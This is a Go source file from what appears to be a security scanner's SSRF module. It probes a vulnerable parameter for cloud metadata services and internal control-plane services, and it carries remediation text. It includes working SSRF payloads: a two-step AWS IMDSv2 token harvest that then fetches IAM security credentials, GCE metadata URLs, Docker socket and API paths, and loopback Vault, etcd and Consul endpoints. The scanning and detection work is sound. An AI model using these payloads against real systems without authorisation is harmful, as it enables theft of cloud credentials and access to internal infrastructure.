package ssrf

import (
	"context"
	"fmt"
	"strings"

	"github.com/TyrusRC/swiss-knife-for-web-security/internal/core"
	internalhttp "github.com/TyrusRC/swiss-knife-for-web-security/internal/http"
)

// toolNameCloudAuthed is the canonical Tool tag on every finding produced by
// the authenticated cloud-metadata probes in this file.
const toolNameCloudAuthed = "ssrf-cloud-advanced-detector"

// cloudAuthedRemediation captures the shared mitigation guidance.
const cloudAuthedRemediation = "Block outbound requests from this service to " +
	"169.254.169.254, metadata.google.internal, the Docker daemon socket, " +
	"and well-known control-plane ports (8200, 2379, 8500). Validate and " +
	"allowlist URLs supplied by users. For AWS, enforce IMDSv2-only and " +
	"set HopLimit=1 on instance metadata so containers cannot reach it."

// ProbeIMDSv2 attempts an IMDSv2-style two-step probe through the SSRF
// parameter on target. It first issues a PUT to /latest/api/token (via the
// vulnerable parameter — the SSRF must allow controlling the HTTP verb, so
// the caller can pass any method here; we mirror the verb the caller wants),
// extracts the token from the response body, and then performs a GET to the
// IAM credentials path while forwarding the X-aws-ec2-metadata-token header.
//
// Returns a Critical finding when either:
//   - the token endpoint returned a plausible IMDS token (short opaque string),
//     AND the follow-up GET surfaced realistic AWS metadata indicators; OR
//   - the token endpoint itself returned AWS metadata indicators (some SSRF
//     proxies normalize PUT→GET, which is still a reachability proof).
//
// Returns (nil, nil) when not vulnerable. Returns (nil, err) only on hard
// transport errors during the very first request.
func (d *Detector) ProbeIMDSv2(ctx context.Context, target, param, method string) (*core.Finding, error) {
	const tokenURL = "http://169.254.169.254/latest/api/token"
	const credsURL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

	// Step 1: request the token. IMDSv2 strictly requires PUT, so we issue
	// PUT first; if the SSRF parameter also accepts a verb override we add
	// it as a method= sibling parameter — that pattern is common in SSRF
	// research labs where the proxy reads `method` from the query.
	tokenResp, err := d.sendIMDSv2TokenRequest(ctx, target, param, tokenURL, method)
	if err != nil {
		return nil, fmt.Errorf("imdsv2 token request failed: %w", err)
	}

	// Strip any echo of the payload URL so we don't match our own input.
	tokenBody := stripEcho(tokenResp.Body, tokenURL)

	// If the token response already contains AWS metadata indicators, the
	// SSRF reached IMDS — flag it without needing the second hop.
	if d.hasCloudMetadataIndicators(tokenBody, "aws") {
		return d.buildCloudAuthedFinding(
			"IMDSv2 Token Path Reachable via SSRF",
			target, param, tokenURL,
			"IMDSv2 token endpoint reachable via SSRF; response surfaced AWS metadata indicators directly.",
			tokenResp,
		), nil
	}

	token := extractIMDSToken(tokenBody)
	if token == "" {
		return nil, nil
	}

	// Step 2: with the harvested token, repeat the SSRF for the credentials
	// path, forwarding the IMDSv2 header through SendPayloadInHeader is not
	// applicable (we need both the url-param AND the auth header on the
	// outbound IMDS call, which the upstream proxy must propagate). Many
	// SSRF gateways pass arbitrary headers through, so we set the token on
	// the request to target — the vulnerable proxy will then attach it to
	// its outbound IMDS request. If it doesn't, the second call simply
	// fails to match and we return nil.
	credsReq := &internalhttp.Request{
		Method: method,
		URL:    buildURLWithParam(target, param, credsURL),
		Headers: map[string]string{
			"X-aws-ec2-metadata-token": token,
		},
	}
	credsResp, err := d.client.Do(ctx, credsReq)
	if err != nil {
		return nil, nil //nolint:nilerr // soft failure; not vulnerable
	}

	credsBody := stripEcho(credsResp.Body, credsURL)
	if !d.hasCloudMetadataIndicators(credsBody, "aws") {
		return nil, nil
	}

	return d.buildCloudAuthedFinding(
		"IMDSv2 Token Path Reachable via SSRF",
		target, param, credsURL,
		fmt.Sprintf("Two-step IMDSv2 probe succeeded: token harvested (%d bytes) and IAM credentials response surfaced realistic AWS metadata structure.", len(token)),
		credsResp,
	), nil
}

// ProbeGCEMetadata probes for GKE / GCE in-cluster reachability. It issues
// SSRF payloads against GCE IMDS endpoints (metadata.google.internal and the
// link-local 169.254.169.254 computeMetadata path), plus the kubernetes
// in-cluster DNS name. Any single response that contains real GCE-metadata
// indicators (≥2 strong markers in hasCloudMetadataIndicators) yields a
// single Critical finding.
//
// Returns (nil, nil) when no probe surfaced indicators.
func (d *Detector) ProbeGCEMetadata(ctx context.Context, target, param, method string) (*core.Finding, error) {
	payloads := []string{
		"http://metadata.google.internal/computeMetadata/v1/?recursive=true",
		"http://169.254.169.254/computeMetadata/v1/?recursive=true",
		"http://kubernetes.default.svc.cluster.local/",
	}

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}

		// GCE metadata strictly requires this header to respond; sending it
		// through SSRF only works if the vulnerable proxy forwards it.
		// We attach it to the SSRF request and trust forwarding behavior;
		// if not forwarded, the test simply won't trigger and we move on.
		req := &internalhttp.Request{
			Method: method,
			URL:    buildURLWithParam(target, param, p),
			Headers: map[string]string{
				"Metadata-Flavor": "Google",
			},
		}
		resp, err := d.client.Do(ctx, req)
		if err != nil || resp == nil {
			continue
		}

		body := stripEcho(resp.Body, p)
		if d.hasCloudMetadataIndicators(body, "gcp") {
			return d.buildCloudAuthedFinding(
				"GCE Cloud Metadata Reachable",
				target, param, p,
				"SSRF reached GCE metadata service; response surfaced Google IMDS indicators (Metadata-Flavor / computeMetadata / service-accounts).",
				resp,
			), nil
		}
	}

	return nil, nil
}

// ProbeDockerSocket probes for an exposed Docker Engine API surface via
// SSRF: the on-host UNIX socket addressed as a URL, the loopback API, and
// the in-cluster docker:2375 hostname. A response containing structural
// Docker-API markers ("Containers":, "DockerRootDir") is treated as proof.
//
// Returns (nil, nil) when no probe surfaced indicators.
func (d *Detector) ProbeDockerSocket(ctx context.Context, target, param, method string) (*core.Finding, error) {
	payloads := []string{
		"unix:///var/run/docker.sock",
		"http://localhost/v1.41/containers/json",
		"http://docker:2375/version",
		"http://localhost/info",
	}

	for _, p := range payloads {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}

		resp, err := d.client.SendPayload(ctx, target, param, p, method)
		if err != nil || resp == nil {
			continue
		}

		body := stripEcho(resp.Body, p)
		if hasDockerIndicators(body) {
			return d.buildCloudAuthedFinding(
				"Docker Socket Exposed via SSRF",
				target, param, p,
				"SSRF surfaced Docker Engine API response (Containers/DockerRootDir markers present).",
				resp,
			), nil
		}
	}

	return nil, nil
}

// ProbeInternalServices probes well-known internal cloud control-plane
// endpoints (Vault, etcd, Consul) on loopback. Each match produces its own
// Critical finding so that a single SSRF reaching multiple services is
// reported with full granularity.
//
// Returns ([], nil) when nothing matched.
func (d *Detector) ProbeInternalServices(ctx context.Context, target, param, method string) ([]*core.Finding, error) {
	type probe struct {
		name    string
		typ     string
		url     string
		matchFn func(body string) bool
		desc    string
	}

	probes := []probe{
		{
			name:    "vault",
			typ:     "Internal Vault Service Reachable",
			url:     "http://127.0.0.1:8200/v1/sys/health",
			matchFn: hasVaultIndicators,
			desc:    "SSRF reached HashiCorp Vault /sys/health endpoint; response surfaced sealed/initialized/version markers characteristic of Vault.",
		},
		{
			name:    "etcd",
			typ:     "Internal etcd Service Reachable",
			url:     "http://127.0.0.1:2379/v2/keys",
			matchFn: hasEtcdIndicators,
			desc:    "SSRF reached etcd /v2/keys endpoint; response surfaced action/node JSON markers characteristic of etcd.",
		},
		{
			name:    "consul",
			typ:     "Internal Consul Service Reachable",
			url:     "http://127.0.0.1:8500/v1/agent/self",
			matchFn: hasConsulIndicators,
			desc:    "SSRF reached Consul /v1/agent/self endpoint; response surfaced Config.Datacenter/NodeName markers characteristic of Consul.",
		},
	}

	var findings []*core.Finding
	for _, pr := range probes {
		select {
		case <-ctx.Done():
			return findings, ctx.Err()
		default:
		}

		resp, err := d.client.SendPayload(ctx, target, param, pr.url, method)
		if err != nil || resp == nil {
			continue
		}

		body := stripEcho(resp.Body, pr.url)
		if pr.matchFn(body) {
			findings = append(findings, d.buildCloudAuthedFinding(
				pr.typ, target, param, pr.url, pr.desc, resp,
			))
		}
	}

	return findings, nil
}

// buildCloudAuthedFinding produces a Critical-severity Finding wired with
// the shared OWASP mappings and Tool tag for this detector. The evidence
// snippet is truncated to keep finding payloads small.
func (d *Detector) buildCloudAuthedFinding(
	findingType, target, param, payload, description string,
	resp *internalhttp.Response,
) *core.Finding {
	f := core.NewFinding(findingType, core.SeverityCritical)
	f.URL = target
	f.Parameter = param
	f.Tool = toolNameCloudAuthed
	f.Confidence = core.ConfidenceHigh
	f.Description = description

	evidence := fmt.Sprintf("Payload: %s", payload)
	if resp != nil && resp.Body != "" {
		body := resp.Body
		if len(body) > 500 {
			body = body[:500] + "..."
		}
		evidence += fmt.Sprintf("\nResponse snippet: %s", body)
	}
	f.Evidence = evidence
	f.Remediation = cloudAuthedRemediation

	f.WithOWASPMapping(
		[]string{"WSTG-INPV-19"},
		[]string{"A01:2025"},
		[]string{"CWE-918"},
	)
	f.APITop10 = []string{"API7:2023"} // Server Side Request Forgery
	return f
}

// sendIMDSv2TokenRequest issues the IMDSv2 token fetch through the SSRF
// parameter. Real IMDSv2 only honors PUT, so we issue PUT as the outer
// HTTP verb. We also add a sibling `method=PUT` query parameter so SSRF
// proxies that read a method-override knob will propagate the verb to the
// upstream IMDS call. If the caller's `method` is GET we still POST-style
// the payload into the body? — no: keeping it simple, PUT outer verb,
// payload in the query param (same as a GET would), method-override sibling.
func (d *Detector) sendIMDSv2TokenRequest(ctx context.Context, target, param, tokenURL, _ string) (*internalhttp.Response, error) {
	rewritten := buildURLWithParam(target, param, tokenURL)
	rewritten = appendQueryParam(rewritten, "method", "PUT")
	req := &internalhttp.Request{
		Method: "PUT",
		URL:    rewritten,
	}
	return d.client.Do(ctx, req)
}

// appendQueryParam appends key=value to a URL's query string. If the URL
// already has the key, it appends an additional pair (we don't replace
// because the original may be load-bearing). Strict string-level helper to
// keep dependencies minimal.
func appendQueryParam(target, key, value string) string {
	sep := "?"
	if strings.Contains(target, "?") {
		sep = "&"
	}
	return target + sep + key + "=" + value
}

// extractIMDSToken pulls a plausible IMDSv2 token from a response body. A
// real IMDSv2 token is an opaque base64-ish blob ~40-100 chars long with no
// whitespace. We accept the trimmed body as the token if it looks like one
// — strictly conservative so HTML/JSON responses don't get treated as tokens.
func extractIMDSToken(body string) string {
	trimmed := strings.TrimSpace(body)
	if trimmed == "" {
		return ""
	}
	// Reject obvious non-token content.
	if strings.ContainsAny(trimmed, " \t\n\r<>{}\"'") {
		return ""
	}
	if len(trimmed) < 16 || len(trimmed) > 256 {
		return ""
	}
	return trimmed
}

// buildURLWithParam takes a target URL and replaces (or adds) the named
// query parameter with the given payload value. Mirrors SendPayload's GET
// semantics so callers using d.client.Do directly can still inject through
// the same parameter.
func buildURLWithParam(target, param, payload string) string {
	// Cheap, allocation-light implementation: find '?' and rewrite the
	// param= section. We deliberately avoid net/url here to keep this
	// helper trivial; if target lacks the param we append it.
	if !strings.Contains(target, "?") {
		return target + "?" + param + "=" + payload
	}

	// Find and replace existing param=...
	prefix, query, _ := strings.Cut(target, "?")
	parts := strings.Split(query, "&")
	replaced := false
	for i, kv := range parts {
		k, _, _ := strings.Cut(kv, "=")
		if k == param {
			parts[i] = param + "=" + payload
			replaced = true
			break
		}
	}
	if !replaced {
		parts = append(parts, param+"="+payload)
	}
	return prefix + "?" + strings.Join(parts, "&")
}

// hasDockerIndicators returns true when the body contains structural markers
// that only appear in Docker Engine API JSON responses. Requires at least
// two distinct markers to keep noise out.
func hasDockerIndicators(body string) bool {
	markers := []string{
		`"Containers":`,
		`"DockerRootDir"`,
		`"ContainersRunning"`,
		`"ServerVersion"`,
		`"ContainerConfig"`,
		`"Driver":"overlay2"`,
	}
	count := 0
	for _, m := range markers {
		if strings.Contains(body, m) {
			count++
		}
	}
	return count >= 2
}

// hasVaultIndicators returns true when the body looks like a HashiCorp Vault
// /sys/health response. Requires multiple Vault-specific markers.
func hasVaultIndicators(body string) bool {
	markers := []string{
		`"initialized":`,
		`"sealed":`,
		`"cluster_name":`,
		`"performance_standby":`,
		`"replication_performance_mode":`,
	}
	count := 0
	for _, m := range markers {
		if strings.Contains(body, m) {
			count++
		}
	}
	return count >= 2
}

// hasEtcdIndicators returns true when the body looks like an etcd v2/v3
// response. etcd v2 uses {"action":...,"node":{...}}; v3 uses different
// shapes but the "action"+"node" pair is highly specific.
func hasEtcdIndicators(body string) bool {
	if strings.Contains(body, `"action":`) && strings.Contains(body, `"node":`) {
		return true
	}
	// etcd v3 health
	if strings.Contains(body, `"health":"true"`) {
		return true
	}
	return false
}

// hasConsulIndicators returns true when the body looks like a Consul
// /v1/agent/self response.
func hasConsulIndicators(body string) bool {
	markers := []string{
		`"Datacenter":`,
		`"NodeName":`,
		`"Config":`,
		`"Member":`,
	}
	count := 0
	for _, m := range markers {
		if strings.Contains(body, m) {
			count++
		}
	}
	return count >= 2
}
